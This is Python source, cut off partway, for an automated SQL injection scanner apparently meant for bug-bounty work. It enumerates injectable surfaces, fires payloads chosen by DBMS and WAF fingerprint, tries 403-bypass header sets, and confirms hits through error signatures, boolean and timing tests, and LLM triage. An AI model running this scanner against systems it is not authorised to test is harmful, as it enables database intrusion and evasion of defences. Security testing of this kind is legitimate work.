#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =============================================================================
#  TRIDENT :: sqli.py — v1.0.0
#  SQL Injection Scanner — the middle prong.
# -----------------------------------------------------------------------------
#  What this does:
#    · Enumerates every injectable surface on every crawled page:
#        URL params · path segments · headers · cookies ·
#        form bodies · JSON bodies · multipart bodies · method variants
#    · Routes payloads by DBMS hint + WAF fingerprint
#    · On 403/401 — loads payloads/403.yaml and tries every applicable
#      bypass, then retries the injection against the winning combo
#    · Verifies findings via 7 strategies (in priority order):
#        1. DBMS error signature (HIGH)
#        2. Boolean pair w/ garbage control (HIGH)
#        3. Time-based w/ 2/2 reproduction (HIGH)
#        4. UNION marker confirmation (HIGH)
#        5. Status escalation w/ SQL-ish body (MEDIUM)
#        6. Body diff (LOW)
#        7. Payload reflection (LOW)
#    · AI triage is fully automatic — picks the best provider from .env
#      and silently no-ops if nothing is available
#
#  Designed to be fast, deadly, and wrong-payload-averse.
# =============================================================================

import argparse
import hashlib
import json
import re
import secrets
import shlex
import statistics
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from urllib.parse import (urlparse, parse_qs, urlencode, urlunparse,
                          urljoin, quote, unquote)

# -----------------------------------------------------------------------------
#  TRIDENT utilities — single source of truth
# -----------------------------------------------------------------------------
from trident_utils import (
    VERSION as TRIDENT_VERSION,
    log, section, banner,
    load_payloads, load_responses, load_json, save_json,
    send_request, safe_filename, format_duration, now_iso,
    HeaderJar, mask_header_value,
    detect_waf, detect_dbms, detect_provider,
    substitute_placeholders,
    iter_payloads, filter_payloads, payload_count, payload_meta,
    get_payload_string, get_header_injection, get_headers_map,
    get_method, get_protocol, get_request_target, describe_payload,
    AI_PROVIDERS, PROVIDER_CHAIN,
    resolve_api_keys, usable_providers, pick_provider,
    load_env, find_env_file, provider_summary,
    C,
)

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None


# =============================================================================
#  CONSTANTS
# =============================================================================
TRIDENT_ART = r"""
   ____  ____  ____  ____  ____  ____
  ||T ||||R ||||I ||||D ||||E ||||N ||||T ||
  ||__||||__||||__||||__||||__||||__||||__||
  |/__\||/__\||/__\||/__\||/__\||/__\||/__\|
     R E C O N   ·   A U D I T   ·   R E P O R T
"""

DESTRUCTIVE_TAGS = {"destructive", "rce", "file-write", "stacked"}

#  Priority order — lower number fires first
PAYLOAD_PRIORITY = {
    "ai_generated":     0,
    "basic_detection":  1,
    "error_based":      2,
    "auth_bypass":      3,
    "boolean_blind":    4,
    "blind_boolean":    4,
    "union_based":      5,
    "blind_time":       6,
    "dbms_specific":    7,
    "waf_bypass":       8,
    "cloud_specific":   9,
    "stacked_queries":  10,
    "legacy":           11,
    "nosql":            12,
    "modern_bypass":    13,
}

#  Header injection presets — kept for compat with the old --header-set flag
HEADER_SETS = {
    "minimal": [
        "X-Forwarded-For", "X-Forwarded-Host", "X-Original-URL",
        "X-Rewrite-URL", "X-HTTP-Method-Override",
        "X-Real-IP", "X-Originating-IP", "True-Client-IP",
    ],
    "standard": [
        "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Proto",
        "X-Forwarded-Prefix", "X-Original-URL", "X-Rewrite-URL",
        "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override",
        "X-Real-IP", "X-Client-IP", "X-Remote-IP", "X-Remote-Addr",
        "X-Originating-IP", "X-Cluster-Client-IP", "True-Client-IP",
        "CF-Connecting-IP", "Fastly-Client-IP", "Client-IP",
        "Forwarded-For", "Forwarded",
    ],
    "aggressive": [
        "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Proto",
        "X-Forwarded-Prefix", "X-Original-URL", "X-Rewrite-URL",
        "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override",
        "X-Real-IP", "X-Client-IP", "X-Remote-IP", "X-Remote-Addr",
        "X-Originating-IP", "X-Cluster-Client-IP", "True-Client-IP",
        "CF-Connecting-IP", "Fastly-Client-IP", "Client-IP",
        "Forwarded-For", "Forwarded",
        "X-User-Id", "X-Account-Id", "X-Tenant-Id", "X-Org-Id",
        "X-Organization-Id", "X-Workspace-Id", "X-Api-Version",
        "X-Original-Host", "X-Host", "X-Backend-Server",
        "Referer", "Origin", "Accept", "Accept-Language",
        "X-Requested-With", "X-Custom-IP-Authorization",
    ],
}

#  Path segments that look like real IDs get tested
_ID_LIKE_RE = re.compile(
    r"^(?:\d{1,12}"
    r"|[a-f0-9]{8,64}"
    r"|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"
    r"|\d+[-_]\d+)$",
    re.I,
)

SKIP_EXTENSIONS = {
    ".js", ".mjs", ".css", ".map",
    ".png", ".jpg", ".jpeg", ".gif", ".svg", ".webp", ".ico", ".bmp",
    ".woff", ".woff2", ".ttf", ".otf", ".eot",
    ".mp3", ".mp4", ".webm", ".wav", ".ogg", ".ogv",
    ".pdf", ".zip", ".tar", ".gz", ".7z", ".rar",
    ".exe", ".dll", ".so", ".bin",
}

CDN_HOST_MARKERS = (
    "cdn.", ".cdn.", "static.", "assets.", "img.", "images.",
    "fonts.", "rbxcdn", "akamaihd", "cloudfront", "cloudflare",
    "fastly", "jsdelivr", "gstatic",
)

#  Built-in fallback error signatures (used if responses/sqli.yaml is absent
#  or malformed — see _load_sqli_signatures below)
_BUILTIN_SIGNATURES = {
    "mysql": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"valid MySQL result",
        r"MySqlClient\.", r"com\.mysql\.jdbc",
        r"check the manual that corresponds to your (MySQL|MariaDB) server version",
        r"You have an error in your SQL syntax",
        r"MySqlException", r"MySQLSyntaxErrorException",
        r"mysqli_", r"MariaDB server version",
        r"Zend_Db_Adapter_Mysqli_Exception",
    ],
    "postgresql": [
        r"PostgreSQL.*ERROR", r"Warning.*\Wpg_",
        r"valid PostgreSQL result", r"Npgsql\.", r"PG::SyntaxError",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
        r"ERROR: parser: parse error at or near",
        r"pg_query\(\)", r"pg_exec\(\)",
        r"unterminated quoted string at or near",
    ],
    "mssql": [
        r"Driver.*SQL[\-\_\ ]*Server", r"OLE DB.*SQL Server",
        r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_",
        r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
        r"Microsoft SQL Native Client error", r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver", r"macromedia\.jdbc\.sqlserver",
        r"com\.jnetdirect\.jsql",
        r"Unclosed quotation mark after the character string",
        r"Incorrect syntax near",
        r"System\.Data\.SqlClient\.SqlException", r"mssql_query\(\)",
    ],
    "oracle": [
        r"\bORA-[0-9]{4,5}", r"Oracle error", r"Oracle.*Driver",
        r"Warning.*\Woci_", r"Warning.*\Wora_", r"oracle\.jdbc",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        r"ORA-00933", r"ORA-01756", r"ORA-00911",
    ],
    "sqlite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception",
        r"(Microsoft|System)\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_", r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]", r"SQLite error \d+:",
        r"sqlite3\.OperationalError:", r"sqlite3\.ProgrammingError:",
        r"SQLite3::SQLException", r"org\.sqlite\.JDBC",
    ],
    "sybase": [
        r"Sybase message", r"Sybase.*Server message",
        r"SybSQLException", r"com\.sybase\.jdbc",
    ],
    "db2":      [r"DB2 SQL error", r"CLI Driver.*DB2", r"com\.ibm\.db2"],
    "informix": [r"Informix ODBC Driver", r"com\.informix\.jdbc"],
    "ingres":   [r"Ingres SQLSTATE", r"Ingres\W.*Driver"],
    "access":   [r"JET Database Engine", r"Access Database Engine",
                 r"Microsoft Access Driver",
                 r"Syntax error.*in query expression"],
    "generic":  [r"SQL command not properly ended", r"syntax error at or near",
                 r"Unclosed quotation mark", r"Unterminated string literal",
                 r"invalid query", r"Dynamic SQL Error",
                 r"Syntax error in string in query expression"],
}

TIME_PAYLOAD_RE = re.compile(
    r"(sleep\s*\(|pg_sleep\s*\(|waitfor\s+delay|benchmark\s*\(|"
    r"dbms_lock\.sleep\s*\(|dbms_pipe\.receive_message\s*\()",
    re.I,
)
UNION_PAYLOAD_RE = re.compile(r"\bunion\b.*\bselect\b", re.I)
GENERIC_500_RE = re.compile(
    r"(sql|query|database|odbc|jdbc|driver|syntax|column|table|"
    r"statement|syntax error)",
    re.I,
)

SEVERITY_RANK = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
AUTH_EXPIRY_THRESHOLD = 0.7


# =============================================================================
#  AI CLIENT — self-contained, auto-detects provider from .env
# =============================================================================
class AIClient:
    """
    Minimal multi-provider chat client for triage and severity calls.
    Picks the first usable provider from .env via trident_utils.pick_provider().
    Silently no-ops when nothing is configured.
    """

    def __init__(self, prefer=None, timeout=45, max_tokens=1200):
        self.timeout = timeout
        self.max_tokens = max_tokens
        self.env = load_env()
        self.keys = resolve_api_keys(self.env)
        self.provider = pick_provider(prefer, self.env)
        if self.provider:
            cfg = AI_PROVIDERS[self.provider]
            self.model = cfg["default"]
            self.label = cfg["label"]
            self.key = self.keys[self.provider]
        else:
            self.model = self.label = self.key = None

        self._lock = threading.Lock()
        self.stats = {"calls": 0, "ok": 0, "failed": 0,
                      "tokens_in": 0, "tokens_out": 0}

    def available(self):
        return bool(self.provider and self.key)

    def _bump(self, ok, ti=0, to=0):
        with self._lock:
            self.stats["calls"] += 1
            self.stats["ok" if ok else "failed"] += 1
            self.stats["tokens_in"] += ti
            self.stats["tokens_out"] += to

    def chat(self, system, user, json_mode=True):
        if not self.available():
            return None, {}
        p = self.provider
        try:
            if p in ("groq", "deepseek", "openai"):
                return self._openai(system, user, json_mode)
            if p == "gemini":
                return self._gemini(system, user, json_mode)
            if p == "anthropic":
                return self._anthropic(system, user)
            if p == "huggingface":
                return self._hf(system, user)
            if p == "ollama":
                return self._ollama(system, user, json_mode)
        except Exception as e:
            log(f"AI call error ({p}): {type(e).__name__}: {e}", "warn", "AI")
            self._bump(False)
            return None, {}
        return None, {}

    def _openai(self, sys_p, usr_p, json_mode):
        cfg = AI_PROVIDERS[self.provider]
        url = cfg["base_url"].rstrip("/") + "/chat/completions"
        body = {
            "model": self.model,
            "messages": [{"role": "system", "content": sys_p},
                         {"role": "user", "content": usr_p}],
            "max_tokens": self.max_tokens,
            "temperature": 0.15,
        }
        if json_mode:
            body["response_format"] = {"type": "json_object"}
        headers = {"Authorization": f"Bearer {self.key}",
                   "Content-Type": "application/json"}
        r = send_request(url, method="POST", headers=headers,
                         json_body=body, timeout=self.timeout)
        if r is None or r.status_code >= 400:
            self._bump(False)
            return None, {}
        data = r.json()
        text = (data.get("choices") or [{}])[0].get("message", {}).get("content", "")
        usage = data.get("usage", {}) or {}
        self._bump(True, usage.get("prompt_tokens", 0),
                   usage.get("completion_tokens", 0))
        return text, usage

    def _gemini(self, sys_p, usr_p, json_mode):
        url = (f"{AI_PROVIDERS['gemini']['base_url']}/models/{self.model}"
               f":generateContent?key={self.key}")
        body = {"contents": [{"role": "user",
                              "parts": [{"text": sys_p + "\n\n" + usr_p}]}],
                "generationConfig": {"temperature": 0.15,
                                      "maxOutputTokens": self.max_tokens}}
        if json_mode:
            body["generationConfig"]["responseMimeType"] = "application/json"
        r = send_request(url, method="POST", json_body=body, timeout=self.timeout)
        if r is None or r.status_code >= 400:
            self._bump(False)
            return None, {}
        data = r.json()
        try:
            text = data["candidates"][0]["content"]["parts"][0]["text"]
        except Exception:
            text = ""
        um = data.get("usageMetadata", {}) or {}
        self._bump(True, um.get("promptTokenCount", 0),
                   um.get("candidatesTokenCount", 0))
        return text, um

    def _anthropic(self, sys_p, usr_p):
        url = AI_PROVIDERS["anthropic"]["base_url"].rstrip("/") + "/messages"
        headers = {"x-api-key": self.key,
                   "anthropic-version": "2023-06-01",
                   "Content-Type": "application/json"}
        body = {"model": self.model, "max_tokens": self.max_tokens,
                "system": sys_p,
                "messages": [{"role": "user", "content": usr_p}]}
        r = send_request(url, method="POST", headers=headers,
                         json_body=body, timeout=self.timeout)
        if r is None or r.status_code >= 400:
            self._bump(False)
            return None, {}
        data = r.json()
        blocks = data.get("content") or []
        text = "".join(b.get("text", "") for b in blocks if b.get("type") == "text")
        um = data.get("usage", {}) or {}
        self._bump(True, um.get("input_tokens", 0), um.get("output_tokens", 0))
        return text, um

    def _hf(self, sys_p, usr_p):
        url = f"{AI_PROVIDERS['huggingface']['base_url'].rstrip('/')}/models/{self.model}"
        headers = {"Authorization": f"Bearer {self.key}"}
        body = {"inputs": sys_p + "\n\n" + usr_p,
                "parameters": {"max_new_tokens": self.max_tokens,
                                "temperature": 0.15,
                                "return_full_text": False}}
        r = send_request(url, method="POST", headers=headers,
                         json_body=body, timeout=self.timeout)
        if r is None or r.status_code >= 400:
            self._bump(False)
            return None, {}
        try:
            data = r.json()
            text = data[0].get("generated_text", "") if isinstance(data, list) and data else str(data)
        except Exception:
            text = ""
        self._bump(True)
        return text, {}

    def _ollama(self, sys_p, usr_p, json_mode):
        url = AI_PROVIDERS["ollama"]["base_url"].rstrip("/") + "/api/chat"
        body = {"model": self.model,
                "messages": [{"role": "system", "content": sys_p},
                             {"role": "user", "content": usr_p}],
                "stream": False,
                "options": {"temperature": 0.15}}
        if json_mode:
            body["format"] = "json"
        r = send_request(url, method="POST", json_body=body, timeout=self.timeout)
        if r is None or r.status_code >= 400:
            self._bump(False)
            return None, {}
        data = r.json()
        text = (data.get("message") or {}).get("content", "")
        self._bump(True, data.get("prompt_eval_count", 0),
                   data.get("eval_count", 0))
        return text, {}

    # --------------------------------------------------------------- #
    def triage(self, finding):
        """Ask the LLM to judge whether this finding is a real bug."""
        if not self.available():
            return None
        sys_p = ("You are a senior bug bounty triager. Classify the given SQLi "
                 "finding as CONFIRMED, LIKELY, or FALSE_POSITIVE. "
                 "Output STRICT JSON only.")
        usr_p = json.dumps({
            "url": finding.get("url"),
            "parameter": finding.get("parameter"),
            "location": finding.get("injection_point", {}).get("location"),
            "payload": finding.get("payload"),
            "verification_method": finding.get("verification_method"),
            "detection_reason": finding.get("detection_reason"),
            "evidence": (finding.get("evidence") or "")[:400],
            "response_snippet": (finding.get("response_snippet") or "")[:600],
            "baseline_snippet": (finding.get("baseline_snippet") or "")[:400],
        }, indent=2)
        usr_p += ('\n\nReturn JSON: {"verdict":"CONFIRMED|LIKELY|FALSE_POSITIVE",'
                  '"confidence":0.0-1.0,"reason":"one sentence"}')
        text, _ = self.chat(sys_p, usr_p, json_mode=True)
        if not text:
            return None
        try:
            obj = json.loads(text)
        except Exception:
            m = re.search(r"\{.*\}", text, re.S)
            if not m:
                return None
            try:
                obj = json.loads(m.group(0))
            except Exception:
                return None
        obj.setdefault("verdict", "LIKELY")
        obj.setdefault("confidence", 0.5)
        return obj

    def severity(self, finding):
        if not self.available():
            return None
        sys_p = ("You assign CVSS-style severity to SQLi findings. "
                 "Output STRICT JSON only.")
        usr_p = json.dumps({
            "url": finding.get("url"),
            "parameter": finding.get("parameter"),
            "subtype": finding.get("subtype"),
            "dbms": finding.get("matched_dbms"),
            "verification_method": finding.get("verification_method"),
        }) + ('\n\nReturn JSON: {"severity":"critical|high|medium|low",'
              '"confidence":0.0-1.0,"reason":"one sentence"}')
        text, _ = self.chat(sys_p, usr_p, json_mode=True)
        if not text:
            return None
        try:
            return json.loads(text)
        except Exception:
            m = re.search(r"\{.*\}", text, re.S)
            return json.loads(m.group(0)) if m else None


# =============================================================================
#  SIGNATURE LOADING
# =============================================================================
def _compile_signature_block(block):
    """Compile a dict of {dbms: [pattern | {regex} | {pattern}, ...]}."""
    out = {}
    if not isinstance(block, dict):
        return out
    for dbms, patterns in block.items():
        if not isinstance(patterns, list):
            continue
        compiled = []
        for pat in patterns:
            regex = None
            if isinstance(pat, str):
                regex = pat
            elif isinstance(pat, dict):
                regex = pat.get("regex") or pat.get("pattern")
            if not regex:
                continue
            try:
                compiled.append(re.compile(regex, re.I))
            except re.error:
                continue
        if compiled:
            out[dbms] = compiled
    return out


def _load_sqli_signatures():
    """
    Load DBMS error signatures from responses/sqli.yaml.
    Falls back to built-ins if the file is missing or malformed.
    """
    data = load_responses("sqli")
    if data:
        for key in ("signatures", "errors", "dbms", "payloads"):
            block = data.get(key) if isinstance(data, dict) else None
            if isinstance(block, dict):
                compiled = _compile_signature_block(block)
                if compiled:
                    log(f"signatures: loaded {len(compiled)} DBMS from "
                        f"responses/sqli.yaml", "info", "SQLI")
                    return compiled
        # Try flat dict of {dbms: [...]}
        compiled = _compile_signature_block(data)
        if compiled:
            log(f"signatures: loaded {len(compiled)} DBMS from "
                f"responses/sqli.yaml (flat)", "info", "SQLI")
            return compiled
    log("signatures: using built-in fallback", "info", "SQLI")
    return {dbms: [re.compile(p, re.I) for p in pats]
            for dbms, pats in _BUILTIN_SIGNATURES.items()}


_SIGNATURES = None
def get_signatures():
    global _SIGNATURES
    if _SIGNATURES is None:
        _SIGNATURES = _load_sqli_signatures()
    return _SIGNATURES


# =============================================================================
#  HELPERS
# =============================================================================
def _url_extension(url):
    path = urlparse(url).path
    if "." not in path.rsplit("/", 1)[-1]:
        return ""
    return "." + path.rsplit(".", 1)[-1].lower()


def _is_static_url(url):
    if _url_extension(url) in SKIP_EXTENSIONS:
        return True
    host = urlparse(url).netloc.lower()
    return any(m in host for m in CDN_HOST_MARKERS)


def _is_id_like(seg):
    if not seg or len(seg) > 64:
        return False
    return bool(_ID_LIKE_RE.match(seg))


def _fp(resp):
    """Fingerprint a response: hash + length + status + ctype."""
    if resp is None:
        return {"hash": None, "length": 0, "status": None, "ctype": ""}
    try:
        body = resp.text or ""
    except Exception:
        body = ""
    stable = re.sub(r"\b[a-f0-9]{24,}\b", "__HEX__", body)
    stable = re.sub(r"\b[A-Za-z0-9+/=]{40,}\b", "__B64__", stable)
    try:
        ctype = (resp.headers.get("Content-Type") or "").split(";")[0].strip()
    except Exception:
        ctype = ""
    return {
        "hash": hashlib.sha256(
            f"{stable}|{ctype}".encode("utf-8", "ignore")
        ).hexdigest()[:16],
        "length": len(body),
        "status": getattr(resp, "status_code", None),
        "ctype": ctype,
    }


def _fp_differ(a, b, min_len_delta=200):
    if not a or not b or a.get("hash") is None or b.get("hash") is None:
        return False
    if a["hash"] == b["hash"]:
        return False
    if a.get("status") != b.get("status"):
        return True
    return abs(a.get("length", 0) - b.get("length", 0)) >= min_len_delta


def _opposite(payload):
    """Return the boolean opposite of a payload, if derivable."""
    if not payload:
        return None
    for t, f in (("1=1", "1=2"), ("1=2", "1=1"),
                 ("'a'='a'", "'a'='b'"), ("'a'='b'", "'a'='a'")):
        if t in payload:
            return payload.replace(t, f)
    return None


def _marker():
    return "trident" + secrets.token_hex(8)


def _ph(payload):
    return hashlib.md5((payload or "").encode("utf-8", "ignore")).hexdigest()[:12]


def _sev_color(sev):
    return {"critical": C.RE, "high": C.OR, "medium": C.YE,
            "low": C.GY, "info": C.GY}.get(sev, C.R)


# =============================================================================
#  INJECTION POINT
# =============================================================================
class InjectionPoint:
    __slots__ = ("url", "method", "location", "name", "value",
                 "json_path", "extra_headers", "form_data", "json_body",
                 "content_type", "is_header_value",
                 "baseline_resp", "baseline_fp", "baseline_body",
                 "control_fp", "timing_baseline", "timing_stddev",
                 "stable", "payloads_tested", "high_confidence_hit",
                 "worth_testing", "bypass_headers", "bypass_url",
                 "bypass_entry")

    def __init__(self, url, method, location, name, value,
                 json_path=None, extra_headers=None, form_data=None,
                 json_body=None, content_type=None, is_header_value=False):
        self.url = url
        self.method = method
        self.location = location
        self.name = name
        self.value = value
        self.json_path = json_path
        self.extra_headers = extra_headers or {}
        self.form_data = form_data or {}
        self.json_body = json_body
        self.content_type = content_type
        self.is_header_value = is_header_value
        self.baseline_resp = None
        self.baseline_fp = None
        self.baseline_body = ""
        self.control_fp = None
        self.timing_baseline = None
        self.timing_stddev = 0.0
        self.stable = True
        self.payloads_tested = 0
        self.high_confidence_hit = False
        self.worth_testing = True
        self.bypass_headers = {}
        self.bypass_url = None
        self.bypass_entry = None

    def key(self):
        return (self.url, self.method, self.location, self.name)

    def __repr__(self):
        return f"<IP {self.location}:{self.name} @ {self.method} {self.url}>"


# =============================================================================
#  EXTRACTION
# =============================================================================
def _ex_query(page):
    u = page["url"]
    qs = parse_qs(urlparse(u).query, keep_blank_values=True)
    return [InjectionPoint(u, "GET", "query", k, v[0]) for k, v in qs.items()]


def _ex_path(page, mode="id_like"):
    if mode == "off":
        return []
    parsed = urlparse(page["url"])
    segs = [s for s in parsed.path.split("/") if s]
    out = []
    for i, seg in enumerate(segs):
        if _is_static_url(f"http://x/{seg}"):
            continue
        if mode == "id_like" and not _is_id_like(seg):
            continue
        out.append(InjectionPoint(
            page["url"], "GET", "path", f"segment[{i}]", seg,
            extra_headers={"_segment_index": str(i)},
        ))
    return out


def _ex_forms(page):
    if BeautifulSoup is None:
        return []
    html = page.get("content") or ""
    if not html:
        return []
    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception:
        return []
    out = []
    for form in soup.find_all("form"):
        action = urljoin(page["url"], form.get("action") or page["url"])
        method = (form.get("method") or "GET").upper()
        ct = (form.get("enctype") or
              "application/x-www-form-urlencoded").lower()
        data = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            itype = (inp.get("type") or "").lower()
            if not name or itype in ("submit", "button", "reset", "file", "image"):
                continue
            data[name] = inp.get("value") or ""
        for name in data:
            out.append(InjectionPoint(
                action, method, "body_form", name, data[name],
                form_data=dict(data), content_type=ct,
            ))
    return out


def _ex_headers(page, enabled):
    out = []
    for h in enabled:
        out.append(InjectionPoint(page["url"], "GET", "header", h, ""))
    req_h = page.get("headers") or {}
    for h in ("Referer", "Origin", "User-Agent", "X-Requested-With"):
        out.append(InjectionPoint(
            page["url"], "GET", "header_value", h, req_h.get(h, ""),
            is_header_value=True,
        ))
    return out


def _ex_cookies(page):
    hdrs = page.get("headers") or {}
    sc = hdrs.get("Set-Cookie") or hdrs.get("set-cookie") or ""
    if not sc:
        return []
    out = []
    for chunk in sc.split(","):
        m = re.match(r"\s*([^=]+)=([^;]+)", chunk)
        if m:
            out.append(InjectionPoint(
                page["url"], "GET", "cookie",
                m.group(1).strip(), m.group(2).strip(),
            ))
    return out


def _set_json_path(obj, path, value):
    tokens = re.findall(r"\.([^\.\[\]]+)|\[(\d+)\]", path)
    cur = obj
    for i, (name, idx) in enumerate(tokens):
        key = name if name else int(idx)
        if i == len(tokens) - 1:
            cur[key] = value
            return
        cur = cur[key]


def _ex_json(page):
    ct = (page.get("content_type") or "").lower()
    body = page.get("content") or ""
    if "json" not in ct and not body.lstrip().startswith(("{", "[")):
        return []
    try:
        data = json.loads(body)
    except Exception:
        return []
    out = []

    def walk(obj, path="$"):
        if isinstance(obj, dict):
            for k, v in obj.items():
                walk(v, f"{path}.{k}")
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                walk(v, f"{path}[{i}]")
        else:
            out.append(InjectionPoint(
                page["url"], "POST", "body_json", path, str(obj),
                json_path=path, json_body=data,
                content_type="application/json",
            ))

    walk(data)
    return out


def _multipart_encode(fields, boundary):
    parts = []
    for name, value in fields.items():
        parts.append("--" + boundary)
        parts.append(f'Content-Disposition: form-data; name="{name}"')
        parts.append("")
        parts.append(str(value))
    parts.append("--" + boundary + "--")
    parts.append("")
    return "\r\n".join(parts).encode("utf-8")


def _ex_multipart(page):
    ct = (page.get("content_type") or "").lower()
    body = page.get("content") or ""
    if "multipart/form-data" not in ct or not body:
        return []
    m = re.search(r'boundary=([^;]+)', ct)
    if not m:
        return []
    boundary = m.group(1).strip().strip('"')
    if not boundary:
        return []
    parts = body.split("--" + boundary)
    fields = []
    for part in parts:
        if not part.strip() or part.strip() == "--":
            continue
        if "\r\n\r\n" in part:
            hp, _, bp = part.partition("\r\n\r\n")
        elif "\n\n" in part:
            hp, _, bp = part.partition("\n\n")
        else:
            continue
        nm = re.search(r'name="([^"]+)"', hp)
        if not nm or "filename=" in hp:
            continue
        fields.append((nm.group(1), bp.strip().rstrip("--").strip()))
    if not fields:
        return []
    data = dict(fields)
    return [InjectionPoint(page["url"], "POST", "body_multipart", n, v,
                            form_data=dict(data),
                            content_type=page.get("content_type"))
            for n, v in fields]


def _ex_methods(page, enable):
    if not enable:
        return []
    qs = parse_qs(urlparse(page["url"]).query, keep_blank_values=True)
    if not qs:
        return []
    out = []
    for method in ("POST", "PUT", "PATCH"):
        for k, v in qs.items():
            out.append(InjectionPoint(
                page["url"], method, "query", k, v[0],
                extra_headers={"_method_variant": method},
            ))
    return out


def extract_points(pages, method_fuzz=False, path_mode="id_like",
                    enabled_headers=None):
    if enabled_headers is None:
        enabled_headers = HEADER_SETS["minimal"]
    out, seen = [], set()
    for page in pages:
        url = page.get("url", "")
        if _is_static_url(url):
            continue
        cands = []
        cands += _ex_query(page)
        cands += _ex_path(page, mode=path_mode)
        cands += _ex_forms(page)
        cands += _ex_headers(page, enabled_headers)
        cands += _ex_cookies(page)
        cands += _ex_json(page)
        cands += _ex_multipart(page)
        cands += _ex_methods(page, enable=method_fuzz)
        for ip in cands:
            k = ip.key()
            if k in seen:
                continue
            seen.add(k)
            out.append(ip)
    return out


def spread_points(points):
    """Round-robin across hosts so we don't hammer one target."""
    by_host = {}
    for ip in points:
        h = urlparse(ip.url).netloc.lower()
        by_host.setdefault(h, []).append(ip)
    out = []
    max_len = max((len(v) for v in by_host.values()), default=0)
    for i in range(max_len):
        for h in by_host:
            if i < len(by_host[h]):
                out.append(by_host[h][i])
    return out


# =============================================================================
#  REQUEST BUILDING
# =============================================================================
def build_request(ip, payload, timeout=12, extra_headers=None,
                  url_suffix=None, override_method=None):
    headers = dict(ip.extra_headers)
    if extra_headers:
        headers.update(extra_headers)
    url = ip.url
    method = override_method or ip.method
    data = None

    if ip.location == "query":
        p = urlparse(url)
        qs = parse_qs(p.query, keep_blank_values=True)
        qs[ip.name] = [payload]
        url = urlunparse(p._replace(query=urlencode(qs, doseq=True)))

    elif ip.location == "path":
        idx = int(headers.pop("_segment_index", "0"))
        p = urlparse(url)
        segs = [s for s in p.path.split("/") if s]
        if idx < len(segs):
            segs[idx] = payload
        url = urlunparse(p._replace(path="/" + "/".join(segs)))

    elif ip.location == "body_form":
        body = dict(ip.form_data)
        body[ip.name] = payload
        data = body
        headers["Content-Type"] = (ip.content_type
                                    or "application/x-www-form-urlencoded")
        if method == "GET":
            method = "POST"

    elif ip.location == "body_multipart":
        body = dict(ip.form_data)
        body[ip.name] = payload
        boundary = f"----TRIDENT{_ph(payload)}"
        data = _multipart_encode(body, boundary)
        headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
        if method == "GET":
            method = "POST"

    elif ip.location == "body_json":
        body = json.loads(json.dumps(ip.json_body))
        _set_json_path(body, ip.json_path, payload)
        data = json.dumps(body)
        headers["Content-Type"] = "application/json"
        if method == "GET":
            method = "POST"

    elif ip.location == "cookie":
        existing = headers.get("Cookie", "")
        pair = f"{ip.name}={payload}"
        headers["Cookie"] = f"{existing}; {pair}".strip("; ") if existing else pair

    elif ip.location in ("header", "header_value"):
        headers[ip.name] = payload

    if url_suffix:
        url = url.rstrip("/") + url_suffix

    headers.pop("_method_variant", None)

    return send_request(url, method=method, headers=headers,
                        timeout=timeout, allow_redirects=False, data=data)


def build_curl(ip, payload, timeout=15, session_headers=None):
    parts = ["curl", "-sk", "--max-time", str(timeout), "-i"]
    if session_headers:
        for k, v in session_headers.items():
            if k.lower() in ("cookie", "authorization", "x-api-key",
                              "x-auth-token", "x-csrf-token"):
                parts += ["-H", shlex.quote(f"{k}: {v}")]
    method = ip.method
    if method != "GET":
        parts += ["-X", method]
    if ip.location == "query":
        p = urlparse(ip.url)
        qs = parse_qs(p.query, keep_blank_values=True)
        qs[ip.name] = [payload]
        parts.append(shlex.quote(urlunparse(p._replace(
            query=urlencode(qs, doseq=True)))))
    elif ip.location == "path":
        idx = int((ip.extra_headers or {}).get("_segment_index", "0"))
        p = urlparse(ip.url)
        segs = [s for s in p.path.split("/") if s]
        if idx < len(segs):
            segs[idx] = payload
        parts.append(shlex.quote(urlunparse(
            p._replace(path="/" + "/".join(segs)))))
    elif ip.location in ("body_form", "body_multipart"):
        body = dict(ip.form_data)
        body[ip.name] = payload
        if ip.location == "body_multipart":
            boundary = f"----TRIDENT{_ph(payload)}"
            parts += ["-H", shlex.quote(
                f"Content-Type: multipart/form-data; boundary={boundary}")]
            for k, v in body.items():
                parts += ["-F", shlex.quote(f"{k}={v}")]
        else:
            for k, v in body.items():
                parts += ["--data-urlencode", shlex.quote(f"{k}={v}")]
        parts.append(shlex.quote(ip.url))
    elif ip.location == "body_json":
        body = json.loads(json.dumps(ip.json_body))
        _set_json_path(body, ip.json_path, payload)
        parts += ["-H", shlex.quote("Content-Type: application/json")]
        parts += ["--data-raw", shlex.quote(json.dumps(body))]
        parts.append(shlex.quote(ip.url))
    elif ip.location == "cookie":
        parts += ["-H", shlex.quote(f"Cookie: {ip.name}={payload}")]
        parts.append(shlex.quote(ip.url))
    elif ip.location in ("header", "header_value"):
        parts += ["-H", shlex.quote(f"{ip.name}: {payload}")]
        parts.append(shlex.quote(ip.url))
    else:
        parts.append(shlex.quote(ip.url))
    return " ".join(parts)


# =============================================================================
#  SQLi SCANNER
# =============================================================================
class SQLiScanner:

    def __init__(self, program_dir, sites_root=None, max_workers=6,
                 delay=0.12, timeout=12, waf_hint=None, dbms_hint=None,
                 time_threshold=4.0, confirm_timing=True,
                 cookie=None, user_agent=None, min_severity="medium",
